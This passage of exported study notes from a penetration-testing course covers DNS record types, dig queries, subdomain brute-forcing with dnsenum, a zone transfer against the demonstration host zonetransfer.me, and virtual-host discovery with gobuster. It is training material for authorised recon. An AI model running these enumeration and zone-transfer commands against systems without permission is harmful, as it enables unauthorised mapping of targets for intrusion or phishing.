purpose:\n\n|Record Type|Full Name|Description|Zone File Example|\n|---|---|---|---|\n|`A`|Address Record|Maps a hostname to its IPv4 address.|`www.example.com.` IN A `192.0.2.1`|\n|`AAAA`|IPv6 Address Record|Maps a hostname to its IPv6 address.|`www.example.com.` IN AAAA `2001:db8:85a3::8a2e:370:7334`|\n|`CNAME`|Canonical Name Record|Creates an alias for a hostname, pointing it to another hostname.|`blog.example.com.` IN CNAME `webserver.example.net.`|\n|`MX`|Mail Exchange Record|Specifies the mail server(s) responsible for handling email for the domain.|`example.com.` IN MX 10 `mail.example.com.`|\n|`NS`|Name Server Record|Delegates a DNS zone to a specific authoritative name server.|`example.com.` IN NS `ns1.example.com.`|\n|`TXT`|Text Record|Stores arbitrary text information, often used for domain verification or security policies.|`example.com.` IN TXT `\"v=spf1 mx -all\"` (SPF record)|\n|`SOA`|Start of Authority Record|Specifies administrative information about a DNS zone, including the primary name server, responsible person's email, and other parameters.|`example.com.` IN SOA `ns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400`|\n|`SRV`|Service Record|Defines the hostname and port number for specific services.|`_sip._udp.example.com.` IN SRV 10 5 5060 `sipserver.example.com.`|\n|`PTR`|Pointer Record|Used for reverse DNS lookups, mapping an IP address to a hostname.|`1.2.0.192.in-addr.arpa.` IN PTR `www.example.com.`|\n\nThe \"`IN`\" in the examples stands for \"Internet.\" It's a class field in DNS records that specifies the protocol family. In most cases, you'll see \"`IN`\" used, as it denotes the Internet protocol suite (IP) used for most domain names. Other class values exist (e.g., `CH` for Chaosnet, `HS` for Hesiod) but are rarely used in modern DNS configurations.\n\nIn essence, \"`IN`\" is simply a convention that indicates that the record applies to the standard internet protocols we use today. While it might seem like an extra detail, understanding its meaning provides a deeper understanding of DNS record structure.\n\n## Why DNS Matters for Web Recon\n\nDNS is not merely a technical protocol for translating domain names; it's a critical component of a target's infrastructure that can be leveraged to uncover vulnerabilities and gain access during a penetration test:\n\n- `Uncovering Assets`: DNS records can reveal a wealth of information, including subdomains, mail servers, and name server records. For instance, a `CNAME` record pointing to an outdated server (`dev.example.com` CNAME `oldserver.example.net`) could lead to a vulnerable system.\n- `Mapping the Network Infrastructure`: You can create a comprehensive map of the target's network infrastructure by analysing DNS data. For example, identifying the name servers (`NS` records) for a domain can reveal the hosting provider used, while an `A` record for `loadbalancer.example.com` can pinpoint a load balancer. This helps you understand how different systems are connected, identify traffic flow, and pinpoint potential choke points or weaknesses that could be exploited during a penetration test.\n- `Monitoring for Changes`: Continuously monitoring DNS records can reveal changes in the target's infrastructure over time. For example, the sudden appearance of a new subdomain (`vpn.example.com`) might indicate a new entry point into the network, while a `TXT` record containing a value like `_1password=...` strongly suggests the organization is using 1Password, which could be leveraged for social engineering attacks or targeted phishing campaigns.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/06-Digging DNS",
    "path": "02_CPTS/04-Information Gathering - Web Edition/06-Digging DNS.md",
    "title": "06 Digging DNS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Having established a solid understanding of DNS fundamentals and its various record types, let's now transition to the practical. This section will explore the tools and techniques for leveraging DNS ...",
    "category": "02_CPTS",
    "content": "Having established a solid understanding of DNS fundamentals and its various record types, let's now transition to the practical. This section will explore the tools and techniques for leveraging DNS for web reconnaissance.\n\n## DNS Tools\n\nDNS reconnaissance involves utilizing specialized tools designed to query DNS servers and extract valuable information. Here are some of the most popular and versatile tools in the arsenal of web recon professionals:\n\n|Tool|Key Features|Use Cases|\n|---|---|---|\n|`dig`|Versatile DNS lookup tool that supports various query types (A, MX, NS, TXT, etc.) and detailed output.|Manual DNS queries, zone transfers (if allowed), troubleshooting DNS issues, and in-depth analysis of DNS records.|\n|`nslookup`|Simpler DNS lookup tool, primarily for A, AAAA, and MX records.|Basic DNS queries, quick checks of domain resolution and mail server records.|\n|`host`|Streamlined DNS lookup tool with concise output.|Quick checks of A, AAAA, and MX records.|\n|`dnsenum`|Automated DNS enumeration tool, dictionary attacks, brute-forcing, zone transfers (if allowed).|Discovering subdomains and gathering DNS information efficiently.|\n|`fierce`|DNS reconnaissance and subdomain enumeration tool with recursive search and wildcard detection.|User-friendly interface for DNS reconnaissance, identifying subdomains and potential targets.|\n|`dnsrecon`|Combines multiple DNS reconnaissance techniques and supports various output formats.|Comprehensive DNS enumeration, identifying subdomains, and gathering DNS records for further analysis.|\n|`theHarvester`|OSINT tool that gathers information from various sources, including DNS records (email addresses).|Collecting email addresses, employee information, and other data associated with a domain from multiple sources.|\n|`Online DNS Lookup Services`|User-friendly interfaces for performing DNS lookups.|Quick and easy DNS lookups, convenient when command-line tools are not available, checking for domain availability or basic information|\n\n## The Domain Information Groper\n\nThe `dig` command (`Domain Information Groper`) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records. Its flexibility and detailed and customizable output make it a go-to choice.\n\n### Common dig Commands\n\n|Command|Description|\n|---|---|\n|`dig domain.com`|Performs a default A record lookup for the domain.|\n|`dig domain.com A`|Retrieves the IPv4 address (A record) associated with the domain.|\n|`dig domain.com AAAA`|Retrieves the IPv6 address (AAAA record) associated with the domain.|\n|`dig domain.com MX`|Finds the mail servers (MX records) responsible for the domain.|\n|`dig domain.com NS`|Identifies the authoritative name servers for the domain.|\n|`dig domain.com TXT`|Retrieves any TXT records associated with the domain.|\n|`dig domain.com CNAME`|Retrieves the canonical name (CNAME) record for the domain.|\n|`dig domain.com SOA`|Retrieves the start of authority (SOA) record for the domain.|\n|`dig @1.1.1.1 domain.com`|Specifies a specific name server to query; in this case 1.1.1.1|\n|`dig +trace domain.com`|Shows the full path of DNS resolution.|\n|`dig -x 192.168.1.1`|Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.|\n|`dig +short domain.com`|Provides a short, concise answer to the query.|\n|`dig +noall +answer domain.com`|Displays only the answer section of the query output.|\n|`dig domain.com ANY`|Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).|\n\nCaution: Some servers can detect and block excessive DNS queries. Use caution and respect rate limits. Always obtain permission before performing extensive DNS reconnaissance on a target.\n\n## Groping DNS\n\nDigging DNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig google.com\n\n; <<>> DiG 9.18.24-0ubuntu0.22.04.1-Ubuntu <<>> google.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16449\n;; flags: qr rd ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0\n;; WARNING: recursion requested but not available\n\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             0       IN      A       142.251.47.142\n\n;; Query time: 0 msec\n;; SERVER: 172.23.176.1#53(172.23.176.1) (UDP)\n;; WHEN: Thu Jun 13 10:45:58 SAST 2024\n;; MSG SIZE  rcvd: 54\n```\n\nThis output is the result of a DNS query using the `dig` command for the domain `google.com`. The command was executed on a system running `DiG` version `9.18.24-0ubuntu0.22.04.1-Ubuntu`. The output can be broken down into four key sections:\n\n1. Header\n    \n    - `;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16449`: This line indicates the type of query (`QUERY`), the successful status (`NOERROR`), and a unique identifier (`16449`) for this specific query.\n        \n        - `;; flags: qr rd ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0`: This describes the flags in the DNS header:\n            - `qr`: Query Response flag - indicates this is a response.\n            - `rd`: Recursion Desired flag - means recursion was requested.\n            - `ad`: Authentic Data flag - means the resolver considers the data authentic.\n            - The remaining numbers indicate the number of entries in each section of the DNS response: 1 question, 1 answer, 0 authority records, and 0 additional records.\n    - `;; WARNING: recursion requested but not available`: This indicates that recursion was requested, but the server does not support it.\n        \n2. Question Section\n    \n    - `;google.com. IN A`: This line specifies the question: \"What is the IPv4 address (A record) for `google.com`?\"\n3. Answer Section\n    \n    - `google.com. 0 IN A 142.251.47.142`: This is the answer to the query. It indicates that the IP address associated with `google.com` is `142.251.47.142`. The '`0`' represents the `TTL` (time-to-live), indicating how long the result can be cached before being refreshed.\n4. Footer\n    \n    - `;; Query time: 0 msec`: This shows the time it took for the query to be processed and the response to be received (0 milliseconds).\n        \n    - `;; SERVER: 172.23.176.1#53(172.23.176.1) (UDP)`: This identifies the DNS server that provided the answer and the protocol used (UDP).\n        \n    - `;; WHEN: Thu Jun 13 10:45:58 SAST 2024`: This is the timestamp of when the query was made.\n        \n    - `;; MSG SIZE rcvd: 54`: This indicates the size of the DNS message received (54 bytes).\n        \n\nAn `opt pseudosection` can sometimes exist in a `dig` query. This is due to Extension Mechanisms for DNS (`EDNS`), which allows for additional features such as larger message sizes and DNS Security Extensions (`DNSSEC`) support.\n\nIf you just want the answer to the question, without any of the other information, you can query `dig` using `+short`:\n\nDigging DNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig +short hackthebox.com\n\n104.18.20.126\n104.18.21.126\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/07-Subdomains",
    "path": "02_CPTS/04-Information Gathering - Web Edition/07-Subdomains.md",
    "title": "07 Subdomains",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "When exploring DNS records, we've primarily focused on the main domain (e.g., example.com) and its associated information. However, beneath the surface of this primary domain lies a potential network ...",
    "category": "02_CPTS",
    "content": "When exploring DNS records, we've primarily focused on the main domain (e.g., `example.com`) and its associated information. However, beneath the surface of this primary domain lies a potential network of subdomains. These subdomains are extensions of the main domain, often created to organise and separate different sections or functionalities of a website. For instance, a company might use `blog.example.com` for its blog, `shop.example.com` for its online store, or `mail.example.com` for its email services.\n\n## Why is this important for web reconnaissance?\n\nSubdomains often host valuable information and resources that aren't directly linked from the main website. This can include:\n\n- `Development and Staging Environments`: Companies often use subdomains to test new features or updates before deploying them to the main site. Due to relaxed security measures, these environments sometimes contain vulnerabilities or expose sensitive information.\n- `Hidden Login Portals`: Subdomains might host administrative panels or other login pages that are not meant to be publicly accessible. Attackers seeking unauthorised access can find these as attractive targets.\n- `Legacy Applications`: Older, forgotten web applications might reside on subdomains, potentially containing outdated software with known vulnerabilities.\n- `Sensitive Information`: Subdomains can inadvertently expose confidential documents, internal data, or configuration files that could be valuable to attackers.\n\n## Subdomain Enumeration\n\n`Subdomain enumeration` is the process of systematically identifying and listing these subdomains. From a DNS perspective, subdomains are typically represented by `A` (or `AAAA` for IPv6) records, which map the subdomain name to its corresponding IP address. Additionally, `CNAME` records might be used to create aliases for subdomains, pointing them to other domains or subdomains. There are two main approaches to subdomain enumeration:\n\n### 1. Active Subdomain Enumeration\n\nThis involves directly interacting with the target domain's DNS servers to uncover subdomains. One method is attempting a `DNS zone transfer`, where a misconfigured server might inadvertently leak a complete list of subdomains. However, due to tightened security measures, this is rarely successful.\n\nA more common active technique is `brute-force enumeration`, which involves systematically testing a list of potential subdomain names against the target domain. Tools like `dnsenum`, `ffuf`, and `gobuster` can automate this process, using wordlists of common subdomain names or custom-generated lists based on specific patterns.\n\n### 2. Passive Subdomain Enumeration\n\nThis relies on external sources of information to discover subdomains without directly querying the target's DNS servers. One valuable resource is `Certificate Transparency (CT) logs`, public repositories of SSL/TLS certificates. These certificates often include a list of associated subdomains in their Subject Alternative Name (SAN) field, providing a treasure trove of potential targets.\n\nAnother passive approach involves utilising `search engines` like Google or DuckDuckGo. By employing specialised search operators (e.g., `site:`), you can filter results to show only subdomains related to the target domain.\n\nAdditionally, various online databases and tools aggregate DNS data from multiple sources, allowing you to search for subdomains without directly interacting with the target.\n\nEach of these methods has its strengths and weaknesses. Active enumeration offers more control and potential for comprehensive discovery but can be more detectable. Passive enumeration is stealthier but might not uncover all existing subdomains. Combining both approaches provides a more thorough and effective subdomain enumeration strategy.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/08-Subdomain Bruteforcing",
    "path": "02_CPTS/04-Information Gathering - Web Edition/08-Subdomain Bruteforcing.md",
    "title": "08 Subdomain Bruteforcing",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Subdomain Brute-Force Enumeration is a powerful active subdomain discovery technique that leverages pre-defined lists of potential subdomain names. This approach systematically tests these names again...",
    "category": "02_CPTS",
    "content": "`Subdomain Brute-Force Enumeration` is a powerful active subdomain discovery technique that leverages pre-defined lists of potential subdomain names. This approach systematically tests these names against the target domain to identify valid subdomains. By using carefully crafted wordlists, you can significantly increase the efficiency and effectiveness of your subdomain discovery efforts.\n\nThe process breaks down into four steps:\n\n1. `Wordlist Selection`: The process begins with selecting a wordlist containing potential subdomain names. These wordlists can be:\n    - `General-Purpose`: Containing a broad range of common subdomain names (e.g., `dev`, `staging`, `blog`, `mail`, `admin`, `test`). This approach is useful when you don't know the target's naming conventions.\n    - `Targeted`: Focused on specific industries, technologies, or naming patterns relevant to the target. This approach is more efficient and reduces the chances of false positives.\n    - `Custom`: You can create your own wordlist based on specific keywords, patterns, or intelligence gathered from other sources.\n2. `Iteration and Querying`: A script or tool iterates through the wordlist, appending each word or phrase to the main domain (e.g., `example.com`) to create potential subdomain names (e.g., `dev.example.com`, `staging.example.com`).\n3. `DNS Lookup`: A DNS query is performed for each potential subdomain to check if it resolves to an IP address. This is typically done using the A or AAAA record type.\n4. `Filtering and Validation`: If a subdomain resolves successfully, it's added to a list of valid subdomains. Further validation steps might be taken to confirm the subdomain's existence and functionality (e.g., by attempting to access it through a web browser).\n\nThere are several tools available that excel at brute-force enumeration:\n\n|Tool|Description|\n|---|---|\n|[dnsenum](https://github.com/fwaeytens/dnsenum)|Comprehensive DNS enumeration tool that supports dictionary and brute-force attacks for discovering subdomains.|\n|[fierce](https://github.com/mschwager/fierce)|User-friendly tool for recursive subdomain discovery, featuring wildcard detection and an easy-to-use interface.|\n|[dnsrecon](https://github.com/darkoperator/dnsrecon)|Versatile tool that combines multiple DNS reconnaissance techniques and offers customisable output formats.|\n|[amass](https://github.com/owasp-amass/amass)|Actively maintained tool focused on subdomain discovery, known for its integration with other tools and extensive data sources.|\n|[assetfinder](https://github.com/tomnomnom/assetfinder)|Simple yet effective tool for finding subdomains using various techniques, ideal for quick and lightweight scans.|\n|[puredns](https://github.com/d3mondev/puredns)|Powerful and flexible DNS brute-forcing tool, capable of resolving and filtering results effectively.|\n\n### DNSEnum\n\n`dnsenum` is a versatile and widely-used command-line tool written in Perl. It is a comprehensive toolkit for DNS reconnaissance, providing various functionalities to gather information about a target domain's DNS infrastructure and potential subdomains. The tool offers several key functions:\n\n- `DNS Record Enumeration`: `dnsenum` can retrieve various DNS records, including A, AAAA, NS, MX, and TXT records, providing a comprehensive overview of the target's DNS configuration.\n- `Zone Transfer Attempts`: The tool automatically attempts zone transfers from discovered name servers. While most servers are configured to prevent unauthorised zone transfers, a successful attempt can reveal a treasure trove of DNS information.\n- `Subdomain Brute-Forcing`: `dnsenum` supports brute-force enumeration of subdomains using a wordlist. This involves systematically testing potential subdomain names against the target domain to identify valid ones.\n- `Google Scraping`: The tool can scrape Google search results to find additional subdomains that might not be listed in DNS records directly.\n- `Reverse Lookup`: `dnsenum` can perform reverse DNS lookups to identify domains associated with a given IP address, potentially revealing other websites hosted on the same server.\n- `WHOIS Lookups`: The tool can also perform WHOIS queries to gather information about domain ownership and registration details.\n\nLet's see `dnsenum` in action by demonstrating how to enumerate subdomains for our target, `inlanefreight.com`. In this demonstration, we'll use the `subdomains-top1million-5000.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists), which contains the top 5000 most common subdomains.\n\nCode: bash\n\n```bash\ndnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r\n```\n\nIn this command:\n\n- `dnsenum --enum inlanefreight.com`: We specify the target domain we want to enumerate, along with a shortcut for some tuning options `--enum`.\n- `-f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`: We indicate the path to the SecLists wordlist we'll use for brute-forcing. Adjust the path if your SecLists installation is different.\n- `-r`: This option enables recursive subdomain brute-forcing, meaning that if `dnsenum` finds a subdomain, it will then try to enumerate subdomains of that subdomain.\n\nSubdomain Bruteforcing\n\n```shell-session\ndrxh3kr@htb[/htb]$ dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \n\ndnsenum VERSION:1.2.6\n\n-----   inlanefreight.com   -----\n\n\nHost's addresses:\n__________________\n\ninlanefreight.com.                       300      IN    A        134.209.24.248\n\n[...]\n\nBrute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:\n_______________________________________________________________________________________\n\nwww.inlanefreight.com.                   300      IN    A        134.209.24.248\nsupport.inlanefreight.com.               300      IN    A        134.209.24.248\n[...]\n\n\ndone.\n\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/09-DNS Zone Transfers",
    "path": "02_CPTS/04-Information Gathering - Web Edition/09-DNS Zone Transfers.md",
    "title": "09 DNS Zone Transfers",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "While brute-forcing can be a fruitful approach, there's a less invasive and potentially more efficient method for uncovering subdomains – DNS zone transfers. This mechanism, designed for replicating D...",
    "category": "02_CPTS",
    "content": "While brute-forcing can be a fruitful approach, there's a less invasive and potentially more efficient method for uncovering subdomains – DNS zone transfers. This mechanism, designed for replicating DNS records between name servers, can inadvertently become a goldmine of information for prying eyes if misconfigured.\n\n## What is a Zone Transfer\n\nA DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. This process is essential for maintaining consistency and redundancy across DNS servers. However, if not adequately secured, unauthorised parties can download the entire zone file, revealing a complete list of subdomains, their associated IP addresses, and other sensitive DNS data.\n\n![Diagram showing data transfer between secondary and primary servers. Includes steps: XML Request, XML Record, loop for retries, XML Report, and AOK (Acknowledgment).](https://mermaid.ink/svg/pako:eNqNkc9qwzAMxl9F-JSx7gV8KISWXcY2aHYYwxdjK39obGWKvBFK333ukg5aGNQnW9b3Q_q-g3LkUWk14mfC6HDb2YZtMBHyGdFR9JanCvkL-WG9vh-4C38FDeX74w52J-0oUHxQRHhjG8ca-W5mXAgy4YqpoXotM8EReygqsSxANZRJWuJOpoXSEw0gC3ku3QTfvlQLfBZh9DeOdbELbCgMPQr-58u1LZsnKEq3j_Tdo28wYJS8iVqpgBxs57PjhxPLKGnzr1E6XzNxb5SJx9xnk1A1Rae0cMKVYkpNq3Rt-zG_0uCtnLM6t6DvhPh5zvM31uMPG8qm-A)\n\n1. `Zone Transfer Request (AXFR)`: The secondary DNS server initiates the process by sending a zone transfer request to the primary server. This request typically uses the AXFR (Full Zone Transfer) type.\n2. `SOA Record Transfer`: Upon receiving the request (and potentially authenticating the secondary server), the primary server responds by sending its Start of Authority (SOA) record. The SOA record contains vital information about the zone, including its serial number, which helps the secondary server determine if its zone data is current.\n3. `DNS Records Transmission`: The primary server then transfers all the DNS records in the zone to the secondary server, one by one. This includes records like A, AAAA, MX, CNAME, NS, and others that define the domain's subdomains, mail servers, name servers, and other configurations.\n4. `Zone Transfer Complete`: Once all records have been transmitted, the primary server signals the end of the zone transfer. This notification informs the secondary server that it has received a complete copy of the zone data.\n5. `Acknowledgement (ACK)`: The secondary server sends an acknowledgement message to the primary server, confirming the successful receipt and processing of the zone data. This completes the zone transfer process.\n\n## The Zone Transfer Vulnerability\n\nWhile zone transfers are essential for legitimate DNS management, a misconfigured DNS server can transform this process into a significant security vulnerability. The core issue lies in the access controls governing who can initiate a zone transfer.\n\nIn the early days of the internet, allowing any client to request a zone transfer from a DNS server was common practice. This open approach simplified administration but opened a gaping security hole. It meant that anyone, including malicious actors, could ask a DNS server for a complete copy of its zone file, which contains a wealth of sensitive information.\n\nThe information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target's DNS infrastructure, including:\n\n- `Subdomains`: A complete list of subdomains, many of which might not be linked from the main website or easily discoverable through other means. These hidden subdomains could host development servers, staging environments, administrative panels, or other sensitive resources.\n- `IP Addresses`: The IP addresses associated with each subdomain, providing potential targets for further reconnaissance or attacks.\n- `Name Server Records`: Details about the authoritative name servers for the domain, revealing the hosting provider and potential misconfigurations.\n\n### Remediation\n\nFortunately, awareness of this vulnerability has grown, and most DNS server administrators have mitigated the risk. Modern DNS servers are typically configured to allow zone transfers only to trusted secondary servers, ensuring that sensitive zone data remains confidential.\n\nHowever, misconfigurations can still occur due to human error or outdated practices. This is why attempting a zone transfer (with proper authorisation) remains a valuable reconnaissance technique. Even if unsuccessful, the attempt can reveal information about the DNS server's configuration and security posture.\n\n#### Exploiting Zone Transfers\n\nYou can use the `dig` command to request a zone transfer:\n\nDNS Zone Transfers\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig axfr @nsztm1.digi.ninja zonetransfer.me\n```\n\nThis command instructs `dig` to request a full zone transfer (`axfr`) from the DNS server responsible for `zonetransfer.me`. If the server is misconfigured and allows the transfer, you'll receive a complete list of DNS records for the domain, including all subdomains.\n\nDNS Zone Transfers\n\n```shell-session\ndrxh3kr@htb[/htb]$ dig axfr @nsztm1.digi.ninja zonetransfer.me\n\n; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr @nsztm1.digi.ninja zonetransfer.me\n; (1 server found)\n;; global options: +cmd\nzonetransfer.me.\t7200\tIN\tSOA\tnsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600\nzonetransfer.me.\t300\tIN\tHINFO\t\"Casio fx-700G\" \"Windows XP\"\nzonetransfer.me.\t301\tIN\tTXT\t\"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\"\nzonetransfer.me.\t7200\tIN\tMX\t0 ASPMX.L.GOOGLE.COM.\n...\nzonetransfer.me.\t7200\tIN\tA\t5.196.105.14\nzonetransfer.me.\t7200\tIN\tNS\tnsztm1.digi.ninja.\nzonetransfer.me.\t7200\tIN\tNS\tnsztm2.digi.ninja.\n_acme-challenge.zonetransfer.me. 301 IN\tTXT\t\"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI\"\n_sip._tcp.zonetransfer.me. 14000 IN\tSRV\t0 0 5060 www.zonetransfer.me.\n14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200\tIN PTR www.zonetransfer.me.\nasfdbauthdns.zonetransfer.me. 7900 IN\tAFSDB\t1 asfdbbox.zonetransfer.me.\nasfdbbox.zonetransfer.me. 7200\tIN\tA\t127.0.0.1\nasfdbvolume.zonetransfer.me. 7800 IN\tAFSDB\t1 asfdbbox.zonetransfer.me.\ncanberra-office.zonetransfer.me. 7200 IN A\t202.14.81.230\n...\n;; Query time: 10 msec\n;; SERVER: 81.4.108.41#53(nsztm1.digi.ninja) (TCP)\n;; WHEN: Mon May 27 18:31:35 BST 2024\n;; XFR size: 50 records (messages 1, bytes 2085)\n```\n\n`zonetransfer.me` is a service specifically setup to demonstrate the risks of zone transfers so that the `dig` command will return the full zone record.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/10-Virtual Hosts",
    "path": "02_CPTS/04-Information Gathering - Web Edition/10-Virtual Hosts.md",
    "title": "10 Virtual Hosts",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Once the DNS directs traffic to the correct server, the web server configuration becomes crucial in determining how the incoming requests are handled. Web servers like Apache, Nginx, or IIS are design...",
    "category": "02_CPTS",
    "content": "Once the DNS directs traffic to the correct server, the web server configuration becomes crucial in determining how the incoming requests are handled. Web servers like Apache, Nginx, or IIS are designed to host multiple websites or applications on a single server. They achieve this through virtual hosting, which allows them to differentiate between domains, subdomains, or even separate websites with distinct content.\n\n## How Virtual Hosts Work: Understanding VHosts and Subdomains\n\nAt the core of `virtual hosting` is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address. This is achieved by leveraging the `HTTP Host` header, a piece of information included in every `HTTP` request sent by a web browser.\n\nThe key difference between `VHosts` and `subdomains` is their relationship to the `Domain Name System (DNS)` and the web server's configuration.\n\n- `Subdomains`: These are extensions of a main domain name (e.g., `blog.example.com` is a subdomain of `example.com`). `Subdomains` typically have their own `DNS records`, pointing to either the same IP address as the main domain or a different one. They can be used to organise different sections or services of a website.\n- `Virtual Hosts` (`VHosts`): Virtual hosts are configurations within a web server that allow multiple websites or applications to be hosted on a single server. They can be associated with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.\n\nIf a virtual host does not have a DNS record, you can still access it by modifying the `hosts` file on your local machine. The `hosts` file allows you to map a domain name to an IP address manually, bypassing DNS resolution.\n\nWebsites often have subdomains that are not public and won't appear in DNS records. These `subdomains` are only accessible internally or through specific configurations. `VHost fuzzing` is a technique to discover public and non-public `subdomains` and `VHosts` by testing various hostnames against a known IP address.\n\nVirtual hosts can also be configured to use different domains, not just subdomains. For example:\n\nCode: apacheconf\n\n```apacheconf\n# Example of name-based virtual host configuration in Apache\n<VirtualHost *:80>\n    ServerName www.example1.com\n    DocumentRoot /var/www/example1\n</VirtualHost>\n\n<VirtualHost *:80>\n    ServerName www.example2.org\n    DocumentRoot /var/www/example2\n</VirtualHost>\n\n<VirtualHost *:80>\n    ServerName www.another-example.net\n    DocumentRoot /var/www/another-example\n</VirtualHost>\n```\n\nHere, `example1.com`, `example2.org`, and `another-example.net` are distinct domains hosted on the same server. The web server uses the `Host` header to serve the appropriate content based on the requested domain name.\n\n### Server VHost Lookup\n\nThe following illustrates the process of how a web server determines the correct content to serve based on the `Host` header:\n\n![Sequence diagram showing interactions between Browser, WebServer, VirtualHostConfig, and DocumentRoot. Includes HTTP request, server response, and file access steps.](https://mermaid.ink/svg/pako:eNqNUsFuwjAM_ZUop00CPqAHDhubuCBNBW2XXrzUtNFap3McOoT496WUVUA3aTkltp_f84sP2rgcdaI9fgYkgwsLBUOdkYqnARZrbAMk6oFd65HHiTd8XyPvfku9WpYA1dJ5eXS0tcW4ZOFMqJEkdU4y6vNnqul8PvRO1HKzeVFpp9KLumvbdmapAsItoy1KmRlX3_fwAXTd4OkLakuoOjVqiZAj_7_PaJJEPVvK1QrElJYK1UcDg1h3HmOEmV4LSlEC0-CA6i24Zb406IRhizuM7BV6BVFCit4FNuh77GX9DeGfmEu-s_mD4b5x5PH2Y4aqhfVNBftufomsGemJrpFrsHncqkOHy7SUWGOmk3jNgT8yndEx1kEQt96T0YlwwIlmF4pSJ1uofHyFJgf52cchirkVx6t-aU-7e_wG--_4bQ)\n\n1. `Browser Requests a Website`: When you enter a domain name (e.g., `www.inlanefreight.com`) into your browser, it initiates an HTTP request to the web server associated with that domain's IP address.\n2. `Host Header Reveals the Domain`: The browser includes the domain name in the request's `Host` header, which acts as a label to inform the web server which website is being requested.\n3. `Web Server Determines the Virtual Host`: The web server receives the request, examines the `Host` header, and consults its virtual host configuration to find a matching entry for the requested domain name.\n4. `Serving the Right Content`: Upon identifying the correct virtual host configuration, the web server retrieves the corresponding files and resources associated with that website from its document root and sends them back to the browser as the HTTP response.\n\nIn essence, the `Host` header functions as a switch, enabling the web server to dynamically determine which website to serve based on the domain name requested by the browser.\n\n### Types of Virtual Hosting\n\nThere are three primary types of virtual hosting, each with its advantages and drawbacks:\n\n1. `Name-Based Virtual Hosting`: This method relies solely on the `HTTP Host header` to distinguish between websites. It is the most common and flexible method, as it doesn't require multiple IP addresses. It’s cost-effective, easy to set up, and supports most modern web servers. However, it requires the web server to support name-based `virtual hosting` and can have limitations with certain protocols like `SSL/TLS`.\n2. `IP-Based Virtual Hosting`: This type of hosting assigns a unique IP address to each website hosted on the server. The server determines which website to serve based on the IP address to which the request was sent. It doesn't rely on the `Host header`, can be used with any protocol, and offers better isolation between websites. Still, it requires multiple IP addresses, which can be expensive and less scalable.\n3. `Port-Based Virtual Hosting`: Different websites are associated with different ports on the same IP address. For example, one website might be accessible on port 80, while another is on port 8080. `Port-based virtual hosting` can be used when IP addresses are limited, but it’s not as common or user-friendly as `name-based virtual hosting` and might require users to specify the port number in the URL.\n\n## Virtual Host Discovery Tools\n\nWhile manual analysis of `HTTP headers` and reverse `DNS lookups` can be effective, specialised `virtual host discovery tools` automate and streamline the process, making it more efficient and comprehensive. These tools employ various techniques to probe the target server and uncover potential `virtual hosts`.\n\nSeveral tools are available to aid in the discovery of virtual hosts:\n\n|Tool|Description|Features|\n|---|---|---|\n|[gobuster](https://github.com/OJ/gobuster)|A multi-purpose tool often used for directory/file brute-forcing, but also effective for virtual host discovery.|Fast, supports multiple HTTP methods, can use custom wordlists.|\n|[Feroxbuster](https://github.com/epi052/feroxbuster)|Similar to Gobuster, but with a Rust-based implementation, known for its speed and flexibility.|Supports recursion, wildcard discovery, and various filters.|\n|[ffuf](https://github.com/ffuf/ffuf)|Another fast web fuzzer that can be used for virtual host discovery by fuzzing the `Host` header.|Customizable wordlist input and filtering options.|\n\n### gobuster\n\nGobuster is a versatile tool commonly used for directory and file brute-forcing, but it also excels at virtual host discovery. It systematically sends HTTP requests with different `Host` headers to a target IP address and then analyses the responses to identify valid virtual hosts.\n\nThere are a couple of things you need to prepare to brute force `Host` headers:\n\n1. `Target Identification`: First, identify the target web server's IP address. This can be done through DNS lookups or other reconnaissance techniques.\n2. `Wordlist Preparation`: Prepare a wordlist containing potential virtual host names. You can use a pre-compiled wordlist, such as SecLists, or create a custom one based on your target's industry, naming conventions, or other relevant information.\n\nThe `gobuster` command to bruteforce vhosts generally looks like this:\n\nVirtual Hosts\n\n```shell-session\ndrxh3kr@htb[/htb]$ gobuster vhost -u http://<target_IP_address> -w 